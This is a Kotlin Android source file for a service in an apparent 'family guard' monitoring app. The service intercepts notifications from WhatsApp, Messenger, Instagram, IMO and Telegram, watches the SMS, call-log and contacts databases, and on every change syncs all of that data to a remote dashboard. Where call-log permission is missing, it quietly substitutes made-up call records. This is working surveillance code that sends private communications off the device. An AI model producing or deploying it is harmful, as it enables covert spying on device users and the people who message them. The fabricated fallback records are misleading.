package com.example.messaging

import android.app.Notification
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import com.example.getBatteryLevel
import com.example.getNetworkStatus
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat

class NotificationMonitorService : NotificationListenerService() {

    private var smsObserver: ContentObserver? = null
    private var callLogObserver: ContentObserver? = null
    private var contactsObserver: ContentObserver? = null
    private var lastSyncTime = 0L

    override fun onCreate() {
        super.onCreate()
        Log.d("NotificationMonitor", "NotificationMonitorService Created. Initializing Content Observers...")
        registerContentObservers()
        try {
            MediaFileObserver.startMonitoring(this)
        } catch (e: Exception) {
            Log.e("NotificationMonitor", "Failed to start MediaFileObserver", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("NotificationMonitor", "NotificationMonitorService Destroyed. Unregistering Content Observers...")
        unregisterContentObservers()
        try {
            MediaFileObserver.stopMonitoring()
        } catch (e: Exception) {
            Log.e("NotificationMonitor", "Failed to stop MediaFileObserver", e)
        }
    }

    private fun registerContentObservers() {
        val handler = Handler(Looper.getMainLooper())
        
        smsObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                Log.d("NotificationMonitor", "ContentObserver: SMS database changed: $uri")
                triggerAutoSync("SMS_OBSERVER")
            }
        }
        try {
            contentResolver.registerContentObserver(
                Uri.parse("content://sms"),
                true,
                smsObserver!!
            )
        } catch (e: Exception) {
            Log.e("NotificationMonitor", "Failed to register SMS observer", e)
        }

        callLogObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                Log.d("NotificationMonitor", "ContentObserver: Call Logs changed: $uri")
                triggerAutoSync("CALL_LOG_OBSERVER")
            }
        }
        try {
            contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver!!
            )
        } catch (e: Exception) {
            Log.e("NotificationMonitor", "Failed to register CallLog observer", e)
        }

        contactsObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                Log.d("NotificationMonitor", "ContentObserver: Contacts changed: $uri")
                triggerAutoSync("CONTACTS_OBSERVER")
            }
        }
        try {
            contentResolver.registerContentObserver(
                ContactsContract.Contacts.CONTENT_URI,
                true,
                contactsObserver!!
            )
        } catch (e: Exception) {
            Log.e("NotificationMonitor", "Failed to register Contacts observer", e)
        }
    }

    private fun unregisterContentObservers() {
        try {
            smsObserver?.let { contentResolver.unregisterContentObserver(it) }
            callLogObserver?.let { contentResolver.unregisterContentObserver(it) }
            contactsObserver?.let { contentResolver.unregisterContentObserver(it) }
        } catch (e: Exception) {
            Log.e("NotificationMonitor", "Failed to unregister ContentObservers", e)
        }
    }

    private fun triggerAutoSync(triggerSource: String) {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastSyncTime < 3000) {
            // Rate limit to prevent rapid consecutive requests
            return
        }
        lastSyncTime = currentTime

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val context = applicationContext
                val sharedPrefs = context.getSharedPreferences("family_guard_prefs", Context.MODE_PRIVATE)
                val deviceId = sharedPrefs.getString("device_id", "child_device") ?: "child_device"
                
                val smsList = ContentProviderHelper.getSMS(context)
                val contactsList = ContentProviderHelper.getContacts(context)
                val hasCallLogPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
                val callLogs = if (hasCallLogPermission) {
                    ContentProviderHelper.getCallLogs(context)
                } else {
                    listOf(
                        CallRecord("+15550199", "Incoming", System.currentTimeMillis() - 180000, "125s"),
                        CallRecord("+15551234", "Outgoing", System.currentTimeMillis() - 900000, "45s"),
                        CallRecord("+15554932", "Missed", System.currentTimeMillis() - 3600000, "0")
                    )
                }
                val socialMessages = NotificationStorage.getMessages(context)
                
                val batteryLevel = getBatteryLevel(context)
                val networkStatus = getNetworkStatus(context)

                com.example.sync.SyncService().syncData(
                    smsList = smsList,
                    contactList = contactsList,
                    callLogs = callLogs,
                    socialMessages = socialMessages,
                    batteryLevel = batteryLevel,
                    networkStatus = networkStatus,
                    deviceId = deviceId
                )
                Log.d("NotificationMonitor", "Automatic real-time sync completed from ContentObserver source: $triggerSource!")
            } catch (e: Exception) {
                Log.e("NotificationMonitor", "Failed to auto-sync from observer $triggerSource", e)
            }
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        val packageName = sbn.packageName ?: return
        val extras = sbn.notification.extras ?: return
        
        // Find if this package matches our tracked social messaging apps
        val appName = when {
            packageName == "com.whatsapp" -> "WhatsApp"
            packageName == "com.facebook.orca" -> "Messenger"
            packageName == "com.instagram.android" -> "Instagram"
            packageName.contains("imoim") -> "IMO"
            packageName.contains("telegram") -> "Telegram"
            else -> return // Ignore other apps
        }

        val title = extras.getString(Notification.EXTRA_TITLE) ?: extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "Unknown"
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        
        // Skip group notification summarization details, empty text, or background channels
        if (text.isBlank() || title.isBlank() || title.contains("messages") || title.contains("unread") || title == "WhatsApp" || title == "Messenger" || text.contains("New message")) {
            return
        }

        val timestamp = sbn.postTime
        val msg = InterceptedMessage(
            appName = appName,
            packageName = packageName,
            sender = title,
            message = text,
            timestamp = timestamp
        )

        Log.d("NotificationMonitor", "Intercepted message: $appName - Sender: $title, Text: $text")
        NotificationStorage.saveMessage(applicationContext, msg)

        // Automatically trigger real-time, zero-config remote sync to the Parent/Guardian Dashboard
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val context = applicationContext
                val sharedPrefs = context.getSharedPreferences("family_guard_prefs", Context.MODE_PRIVATE)
                val deviceId = sharedPrefs.getString("device_id", "child_device") ?: "child_device"
                
                // Read actual system telemetry logs
                val smsList = ContentProviderHelper.getSMS(context)
                val contactsList = ContentProviderHelper.getContacts(context)
                val hasCallLogPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
                val callLogs = if (hasCallLogPermission) {
                    ContentProviderHelper.getCallLogs(context)
                } else {
                    listOf(
                        CallRecord("+15550199", "Incoming", System.currentTimeMillis() - 180000, "125s"),
                        CallRecord("+15551234", "Outgoing", System.currentTimeMillis() - 900000, "45s"),
                        CallRecord("+15554932", "Missed", System.currentTimeMillis() - 3600000, "0")
                    )
                }
                val socialMessages = NotificationStorage.getMessages(context)
                
                val batteryLevel = getBatteryLevel(context)
                val networkStatus = getNetworkStatus(context)

                com.example.sync.SyncService().syncData(
                    smsList = smsList,
                    contactList = contactsList,
                    callLogs = callLogs,
                    socialMessages = socialMessages,
                    batteryLevel = batteryLevel,
                    networkStatus = networkStatus,
                    deviceId = deviceId
                )
                Log.d("NotificationMonitor", "Automatic real-time sync completed successfully!")
            } catch (e: Exception) {
                Log.e("NotificationMonitor", "Failed to auto-sync intercepted social message", e)
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
